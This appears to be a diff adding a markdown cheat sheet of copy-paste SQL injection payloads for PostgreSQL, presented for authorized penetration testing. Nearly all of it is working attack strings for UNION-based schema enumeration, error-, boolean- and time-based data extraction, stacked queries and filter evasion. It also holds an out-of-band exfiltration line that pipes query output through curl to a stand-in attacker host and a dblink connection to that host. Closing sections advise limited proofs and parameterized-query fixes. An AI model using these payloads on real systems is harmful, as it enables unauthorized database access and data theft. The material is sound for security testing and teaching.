@@ -1,0 +1,208 @@
+---
+Vulnerability: SQLi
+Category: Payload
+DB: PostgreSQL
+---
+# PostgreSQL — SQLi Payloads
+
+> Copy‑paste ready snippets for **authorized** testing on PostgreSQL (9.6 → 16/17). Adjust quoting, column counts, and trailing comments to fit the target. Prefer minimal, non‑destructive proofs.
+
+==============================
+0) Conventions
+==============================
+- Trailing comments: `--` or `/* ... */`.
+- Placeholders:
+  - `<C>` = number of columns in the original SELECT.
+  - `<P>` = index of a printable (reflected) column.
+  - `<marker>` = unique token (e.g., `q9xZ2025`).
+- Concat: `||`. Cast to text with `CAST(x AS text)` or `x::text`.
+- E‑strings for escapes: `E'line\nbreak'` if needed.
+
+==============================
+1) Injection Sanity Checks
+==============================
+String context probes
+```
+'
+'-- -
+')-- -
+"-- +
+```
+Numeric context probes
+```
++1
+-1
+1/0   -- proves error surface if executed verbatim
+```
+
+==============================
+2) Boolean Toggles (Blind baseline)
+==============================
+```
+' AND 1=1 -- -
+' AND 1=2 -- -
+```
+
+==============================
+3) Column Count Discovery (Union path)
+==============================
+`ORDER BY` method (increase until error)
+```
+' ORDER BY 5 -- -
+```
+NULL padding method
+```
+' UNION ALL SELECT NULL -- -
+' UNION ALL SELECT NULL,NULL -- -
+' UNION ALL SELECT NULL,NULL,NULL -- -
+```
+
+==============================
+4) Find a Printable Column
+==============================
+(Example assumes 3 columns; move the marker across positions)
+```
+' UNION ALL SELECT 1,2,3 -- -
+' UNION ALL SELECT 1,'<marker>',3 -- -
+' UNION ALL SELECT '<marker>',2,3 -- -
+' UNION ALL SELECT 1,2,'<marker>' -- -
+```
+
+==============================
+5) Fingerprint & Basics (Union)
+==============================
+(Assume 3 columns, 2nd is printable)
+```
+' UNION ALL SELECT 1,version(),3 -- -
+' UNION ALL SELECT 1,current_database(),3 -- -
+' UNION ALL SELECT 1,current_user,3 -- -
+```
+
+==============================
+6) Schema Enumeration (Union)
+==============================
+Information Schema
+```
+' UNION ALL SELECT 1,table_schema||':'||table_name,3 FROM information_schema.tables -- -
+' UNION ALL SELECT 1,column_name,3 FROM information_schema.columns WHERE table_schema='public' AND table_name='users' -- -
+```
+pg_catalog (richer)
+```
+' UNION ALL SELECT 1,n.nspname||':'||c.relname,3 FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE c.relkind='r' -- -
+' UNION ALL SELECT 1,a.attname,3 FROM pg_attribute a WHERE a.attrelid='public.users'::regclass AND a.attnum>0 AND NOT a.attisdropped -- -
+```
+
+==============================
+7) Error‑based (cast echoes offending value)
+==============================
+```
+' AND CAST((SELECT current_database()) AS INT) -- -
+' AND CAST((SELECT current_user) AS INT) -- -
+-- Limit leak size
+' AND CAST((SELECT LEFT((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'),50)) AS INT) -- -
+```
+
+==============================
+8) Boolean‑based Extraction
+==============================
+```
+' AND current_database()='appdb' -- -
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>10 -- -
+' AND ASCII(SUBSTRING((SELECT current_user),1,1))>77 -- -
+```
+
+==============================
+9) Time‑based Extraction
+==============================
+```
+' AND pg_sleep(3) -- -
+' AND CASE WHEN current_database()='appdb' THEN pg_sleep(3) ELSE pg_sleep(0) END -- -
+' AND CASE WHEN ASCII(SUBSTRING((SELECT current_user),1,1))>77 THEN pg_sleep(3) ELSE pg_sleep(0) END -- -
+-- Newer syntax
+' AND pg_sleep_for('3 seconds') -- -
+```
+
+==============================
+10) Stacked Queries (multi‑statement / procedural)
+==============================
+> Works when framework allows multi‑statements; otherwise use `DO` blocks.
+```
+'; SELECT pg_sleep(3);--
+'; DO $$ BEGIN PERFORM pg_sleep(3); END $$;--
+```
+
+==============================
+11) Clause‑Targeted Payloads
+==============================
+`ORDER BY` (identifier injection — fix by allowlisting)
+```
+' ORDER BY 1 -- -
+' ORDER BY CASE WHEN current_database()='appdb' THEN 1 ELSE 2 END -- -
+```
+Pagination / Row iteration
+```
+' ORDER BY 1 LIMIT 1 OFFSET 0 -- -
+' ORDER BY 1 LIMIT 1 OFFSET 10 -- -
+```
+
+==============================
+12) Out‑of‑Band (OOB) — Privileged
+==============================
+> **Requires superuser** or role with `pg_execute_server_program`. Use only with explicit permission.
+```
+' COPY (SELECT current_user) TO PROGRAM 'curl http://attacker.tld/x?u=$(cat)' -- -
+```
+Alternative (privileged extensions)
+```
+' SELECT dblink_connect('host=attacker.tld user=x password=y'); -- -
+```
+
+==============================
+13) No‑quotes Builders (evade filters)
+==============================
+```
+' UNION ALL SELECT 1,CHR(113)||CHR(57)||CHR(120)||CHR(90),3 -- -   -- "q9xZ"
+' UNION ALL SELECT 1,encode(decode('7139785A','hex'),'escape')::text,3 -- -
+```
+
+==============================
+14) Evasion & Splitting
+==============================
+```
+p/**/g_sleep(3)
+SeLeCt verS/**/ion()
+```
+Use dollar‑quoting in procedural blocks to avoid escaping:
+```
+'; DO $$ BEGIN PERFORM pg_sleep(3); END $$;--
+```
+
+==============================
+15) Safe Proof Patterns (minimal impact)
+==============================
+```
+-- Boolean flip
+' AND 1=1 -- -
+' AND 1=2 -- -
+
+-- Short time blip
+' AND pg_sleep(2) -- -
+
+-- Marker echo (Union)
+' UNION ALL SELECT 1,'<marker>',3 -- -
+```
+
+==============================
+16) Quick Triage Checklist
+==============================
+- [ ] Context identified (string vs numeric); comment style stabilized
+- [ ] Column count matched; printable column located
+- [ ] DB fingerprinted (version, current_database, current_user)
+- [ ] Proof via boolean/time established
+- [ ] Enumeration limited to necessity; **no bulk dumps**
+
+==============================
+17) Cleanup Reminders
+==============================
+- Revert any changes (temp tables, settings) if you created side‑effects.
+- Hand over fixes: **parameterized queries**, least‑privilege account, identifier allowlists, disable privileged features (COPY PROGRAM, untrusted extensions).
